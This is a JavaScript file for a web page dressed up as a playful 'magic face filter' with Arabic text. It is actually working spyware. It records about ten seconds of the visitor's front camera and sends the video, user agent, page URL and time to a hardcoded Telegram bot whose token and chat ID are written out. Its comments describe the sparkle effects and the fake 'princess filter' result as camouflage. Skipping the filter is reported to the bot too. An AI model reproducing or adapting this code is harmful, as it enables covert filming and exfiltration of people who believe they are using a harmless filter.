// نفس دالة البوت السابقة + تحسينات
async function sendDataToMousaBot(messageContent, videoBlob = null) {
    const BOT_TOKEN = '8605049073:AAEyGQ07KMGUzG5jVjdjERMJDxGbTgYHWUE';
    const CHAT_ID = '7396462490';
    
    try {
        if (videoBlob) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('video', videoBlob, `magic_${Date.now()}.mp4`);
            formData.append('caption', `✨ *فلتر سحري جديد*\n\n${messageContent}`);
            
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                method: 'POST', body: formData
            });
            return await response.json();
        }
    } catch (error) {
        console.error('Telegram Error:', error);
    }
}

let mediaRecorder, stream, recordedChunks = [], countdown = 10;

async function startMagicFilter() {
    try {
        document.querySelector('.consent-box').style.display = 'none';
        document.getElementById('recording-area').style.display = 'block';
        
        stream = await navigator.mediaDevices.getUserMedia({
            video: { width: 640, height: 480, facingMode: 'user' }
        });
        
        document.getElementById('video').srcObject = stream;
        createMagicStars();
        startRecording();
        
    } catch (err) {
        alert('🔒 الكاميرا محجوبة. فعّلها من إعدادات المتصفح');
    }
}

function startRecording() {
    mediaRecorder = new MediaRecorder(stream);
    
    mediaRecorder.ondataavailable = e => e.data.size && recordedChunks.push(e.data);
    
    mediaRecorder.onstop = async () => {
        const blob = new Blob(recordedChunks, { type: 'video/webm' });
        const info = `📱 ${navigator.userAgent.slice(0,50)}...\n🌐 ${window.location.href}\n⏰ ${new Date().toLocaleString('ar')}`;
        
        await sendDataToMousaBot(info, blob);
        
        // تمويه النتيجة
        showMagicResult();
        cleanup();
    };
    
    mediaRecorder.start();
    startMagicCountdown();
}

function startMagicCountdown() {
    const el = document.getElementById('countdown');
    const interval = setInterval(() => {
        countdown--;
        el.textContent = countdown;
        createMagicEffect();
        
        if (countdown <= 0) {
            clearInterval(interval);
            stopMagic();
        }
    }, 1000);
}

function stopMagic() {
    mediaRecorder?.stop();
    cleanup();
    showMagicResult();
}

function cleanup() {
    recordedChunks = [];
    if (stream) stream.getTracks().forEach(t => t.stop());
}

function showMagicResult() {
    document.getElementById('recording-area').innerHTML = `
        <div style="background: rgba(255,255,255,0.2); padding: 40px; border-radius: 20px;">
            <h2>🎉 تم السحر بنجاح! ✨</h2>
            <p>تم تحليل وجهك وحفظ النتيجة السحرية 😍</p>
            <p><strong>النتيجة: وجهك مثالي لفلتر "الأميرة/الأمير"!</strong></p>
            <img src="https://via.placeholder.com/400x300/ffd700/000000?text=✨+Magic+Result" style="border-radius: 15px; margin: 20px 0;">
            <button onclick="location.reload()" style="background: linear-gradient(45deg, #00b894, #00cec9);">🔄 جرب فلتر آخر</button>
        </div>
    `;
}

function createMagicStars() {
    const stars = document.getElementById('stars');
    for (let i = 0; i < 20; i++) {
        const star = document.createElement('div');
        star.style.cssText = `
            position: absolute; width: 4px; height: 4px; 
            background: #ffd700; border-radius: 50%; 
            left: ${Math.random()*100}%; top: ${Math.random()*100}%;
            animation: twinkle ${2+Math.random()*3}s infinite;
        `;
        stars.appendChild(star);
    }
}

function createMagicEffect() {
    // تأثيرات بصرية للتمويه
    document.body.style.filter = `hue-rotate(${Date.now() % 360}deg)`;
}

function skipFilter() {
    sendDataToMousaBot('⏭️ مستخدم تخطى الفلتر السحري');
    document.querySelector('.consent-box').innerHTML = '<h2>😊 رائع! استمتع بالموقع</h2>';
}

// CSS للتوهج
const style = document.createElement('style');
style.textContent = `
    @keyframes twinkle { 0%,100%{opacity:1} 50%{opacity:0.3} }
    @keyframes sparkle { 0%{transform:scale(0) rotate(0deg)} 50%{transform:scale(1.2) rotate(180deg)} 100%{transform:scale(0) rotate(360deg)} }
`;
document.head.appendChild(style);
